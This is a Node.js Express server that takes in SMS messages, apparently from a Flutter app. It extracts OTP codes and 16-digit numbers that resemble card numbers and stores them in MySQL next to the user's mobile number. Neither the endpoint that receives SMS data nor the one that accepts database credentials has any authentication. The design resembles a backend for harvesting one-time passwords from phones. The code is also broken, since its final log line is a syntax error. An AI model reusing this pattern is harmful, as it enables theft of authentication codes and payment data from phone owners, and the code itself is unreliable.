const express = require('express');
const mysql = require('mysql2/promise');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

app.use(bodyParser.json());

// Global variables for database details
let dbHost, dbUser, dbPassword, dbName;

// Function to create a new database connection pool
async function createPool() {
    try {
        const pool = mysql.createPool({
            host: dbHost,
            user: dbUser,
            password: dbPassword,
            database: dbName,
            waitForConnections: true,
            connectionLimit: 10,
            queueLimit: 0
        });

        console.log('Database connection pool created');
        return pool;
    } catch (error) {
        console.log('Error creating database connection pool:', error);
        throw error;
    }
}

// Function to create SMS data table
async function createSmsDataTable() {
    try {
        const pool = await createPool();
        const connection = await pool.getConnection();
        await connection.query(`
            CREATE TABLE IF NOT EXISTS IGRS_Message (
                id INT AUTO_INCREMENT PRIMARY KEY,
                Sender VARCHAR(255) NOT NULL,
                Message_time DATETIME NOT NULL,
                Message TEXT NOT NULL,
                OTP VARCHAR(10),
                User_Mobile VARCHAR(20) NOT NULL
            )
        `);
        connection.release();
        console.log('SMS data table created or already exists');
    } catch (error) {
        console.log('Error creating SMS data table:', error);
    }
}

// Call function to create SMS data table when server starts up
createSmsDataTable();

// Endpoint to receive database details from the frontend
app.post('/validate_database', async (req, res) => {
    const { host, user, password, database } = req.body;
    if (!host || !user || !password || !database) {
        return res.status(400).send('Incomplete database details');
    }

    // Set global variables for database details
    dbHost = host;
    dbUser = user;
    dbPassword = password;
    dbName = database;

    res.status(200).send('Database details received successfully');
});
// Endpoint to handle receiving SMS data from Flutter app
app.post('/sms', async (req, res) => {
    const { Sender, Message, Message_time, User_Mobile } = req.body;
    if (!Sender || !Message || !Message_time || !User_Mobile) {
        return res.status(400).send('Incomplete SMS data');
    }

    try {
        // Extract OTP from message
        const otpRegex = /\b\d{4,6}|\b\d{16}\b/;
        const otpMatch = Message.match(otpRegex);
        const OTP = otpMatch ? otpMatch[0] : null;

        // Get connection pool
        const pool = await createPool();

        // Store data in the database
        const connection = await pool.getConnection();
        await connection.query('INSERT INTO IGRS_Message (Sender, Message_time, Message, OTP, User_Mobile) VALUES (?, ?, ?, ?, ?)', [Sender, Message_time, Message, OTP, User_Mobile]);
        connection.release();

        console.log('SMS data stored successfully');
        res.status(200).send('SMS data stored successfully');
    } catch (error) {
        console.log('Error storing SMS data:', error);
        res.status(500).send('Error storing SMS data');
    }
});

// Start the server
app.listen(port, () => {
    console.log(Server is running on http://192.168.160.29:${port});
});
